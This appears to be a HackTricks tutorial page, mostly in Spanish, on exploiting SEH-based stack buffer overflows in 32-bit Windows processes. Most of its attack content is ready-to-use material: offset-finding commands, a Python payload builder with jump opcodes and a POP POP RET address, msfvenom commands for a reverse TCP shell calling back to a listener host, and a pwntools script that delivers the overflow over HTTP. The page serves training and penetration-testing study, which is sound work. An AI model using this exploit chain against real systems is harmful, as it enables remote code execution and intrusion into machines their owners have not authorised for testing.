# Windows SEH-based Stack Overflow Exploitation (nSEH/SEH)

{{#include ../../banners/hacktricks-training.md}}

La explotación basada en SEH es una técnica clásica de Windows x86 que abusa de la cadena Structured Exception Handler almacenada en la pila. Cuando un desbordamiento de búfer en la pila sobrescribe los dos campos de 4 bytes

- nSEH: pointer to the next SEH record, and
- SEH: pointer to the exception handler function

un atacante puede tomar el control de la ejecución mediante:

1) Establecer SEH a la dirección de un POP POP RET gadget en un módulo no protegido, de modo que cuando se despacha una excepción el gadget retorne hacia bytes controlados por el atacante, y
2) Usar nSEH para redirigir la ejecución (típicamente un short jump) de vuelta al gran buffer desbordado donde reside el shellcode.

Esta técnica es específica de procesos de 32 bits (x86). En sistemas modernos, preferir un módulo sin SafeSEH y sin ASLR para el gadget. Bad characters suelen incluir 0x00, 0x0a, 0x0d (NUL/CR/LF) debido a C-strings y al parsing HTTP.

---

## Encontrar offsets exactos (nSEH / SEH)

- Provoca un crash en el proceso y verifica que la cadena SEH ha sido sobrescrita (p. ej., en x32dbg/x64dbg, revisa la vista SEH).
- Envía un patrón cíclico como los datos desbordantes y calcula los offsets de los dos dwords que caen en nSEH y SEH.

Ejemplo con peda/GEF/pwntools en un cuerpo POST de 1000 bytes:
```bash
# generate pattern (any tool is fine)
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
# or
python3 -c "from pwn import *; print(cyclic(1000).decode())"

# after crash, note the two 32-bit values from SEH view and compute offsets
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x32424163   # nSEH
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x41484241   # SEH
# ➜ offsets example: nSEH=660, SEH=664
```
Valida colocando marcadores en esas posiciones (p. ej., nSEH=b"BB", SEH=b"CC"). Mantén la longitud total constante para que el crash sea reproducible.

---

## Elección de un POP POP RET (SEH gadget)

Necesitas una secuencia POP POP RET para desenrollar el frame SEH y regresar a tus bytes nSEH. Búscala en un módulo sin SafeSEH y, preferiblemente, sin ASLR:

- Mona (Immunity/WinDbg): `!mona modules` luego `!mona seh -m modulename`.
- x64dbg plugin ERC.Xdbg: `ERC --SEH` para listar POP POP RET gadgets y el estado de SafeSEH.

Elige una dirección que no contenga badchars cuando se escriba en little-endian (p. ej., `p32(0x004094D8)`). Prefiere gadgets dentro del binario vulnerable si las protecciones lo permiten.

---

## Técnica de salto hacia atrás (short + near jmp)

nSEH solo tiene 4 bytes, lo que admite como mucho un short jump de 2 bytes (`EB xx`) más padding. Si debes saltar hacia atrás cientos de bytes para alcanzar el inicio de tu buffer, usa un near jump de 5 bytes colocado justo antes de nSEH y encadena hacia él con un short jump desde nSEH.

Con nasmshell:
```text
nasm> jmp -660           ; too far for short; near jmp is 5 bytes
E967FDFFFF
nasm> jmp short -8       ; 2-byte short jmp fits in nSEH (with 2 bytes padding)
EBF6
nasm> jmp -652           ; 8 bytes closer (to account for short-jmp hop)
E96FFDFFFF
```
Idea de diseño para un payload de 1000 bytes con nSEH en el offset 660:
```python
buffer_length = 1000
payload  = b"\x90"*50 + shellcode                    # NOP sled + shellcode at buffer start
payload += b"A" * (660 - 8 - len(payload))           # pad so we are 8 bytes before nSEH
payload += b"\xE9\x6F\xFD\xFF\xFF" + b"EEE"     # near jmp -652 (5B) + 3B padding
payload += b"\xEB\xF6" + b"BB"                      # nSEH: short jmp -8 + 2B pad
payload += p32(0x004094D8)                           # SEH: POP POP RET (no badchars)
payload += b"D" * (buffer_length - len(payload))
```
Flujo de ejecución:
- Ocurre una excepción, el dispatcher usa el SEH sobrescrito.
- POP POP RET desempila hacia nuestro nSEH.
- nSEH ejecuta `jmp short -8` hacia el near jump de 5 bytes.
- El near jump aterriza al inicio de nuestro buffer donde residen el NOP sled + shellcode.

---

## Caracteres malos

Construye una cadena completa de badchar y compara la memoria del stack después del crash, eliminando bytes que sean alterados por el parser objetivo. Para HTTP-based overflows, `\x00\x0a\x0d` casi siempre están excluidos.
```python
badchars = bytes([x for x in range(1,256)])
payload  = b"A"*660 + b"BBBB" + b"CCCC" + badchars  # position appropriately for your case
```
---

## Shellcode generation (x86)

Usa msfvenom con tus badchars. Un pequeño NOP sled ayuda a tolerar variaciones en el punto de aterrizaje.
```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> \
-b "\x00\x0a\x0d" -f python -v sc
```
Si se genera sobre la marcha, el formato hex es conveniente para incrustarlo y decodificarlo en Python:
```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> \
-b "\x00\x0a\x0d" -f hex
```
---

## Entrega vía HTTP (CRLF preciso + Content-Length)

Cuando el vector vulnerable es el cuerpo de una solicitud HTTP, construye una raw request con CRLFs exactos y Content-Length correcto para que el servidor lea todo el cuerpo que desborda.
```python
# pip install pwntools
from pwn import remote
host, port = "<TARGET_IP>", 8080
body = b"A" * 1000  # replace with the SEH-aware buffer above
req = f"""POST / HTTP/1.1
Host: {host}:{port}
User-Agent: curl/8.5.0
Accept: */*
Content-Length: {len(body)}
Connection: close

""".replace('\n','\r\n').encode() + body
p = remote(host, port)
p.send(req)
print(p.recvall(timeout=0.5))
p.close()
```
---

## Herramientas

- x32dbg/x64dbg para observar la cadena SEH y analizar el crash.
- ERC.Xdbg (x64dbg plugin) para enumerar gadgets SEH: `ERC --SEH`.
- Mona como alternativa: `!mona modules`, `!mona seh`.
- nasmshell para ensamblar saltos cortos/near y copiar raw opcodes.
- pwntools para crear payloads de red precisos.

---

## Notas y advertencias

- Aplica solo a procesos x86. x64 usa un esquema diferente de SEH y la explotación basada en SEH generalmente no es viable.
- Preferir gadgets en módulos sin SafeSEH y ASLR; de lo contrario, encontrar un módulo no protegido cargado en el proceso.
- Los watchdogs de servicio que reinician automáticamente tras un crash pueden facilitar el desarrollo iterativo del exploit.

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf)](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [ERC.Xdbg – Exploit Research Plugin for x64dbg (SEH search)](https://github.com/Andy53/ERC.Xdbg)
- [Corelan – Exploit writing tutorial part 7 (SEH)](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-7-unicode-0day-buffer-overflow-seh-and-venetian-shellcode/)
- [Mona.py – WinDbg/Immunity helper](https://github.com/corelan/mona)

{{#include ../../banners/hacktricks-training.md}}
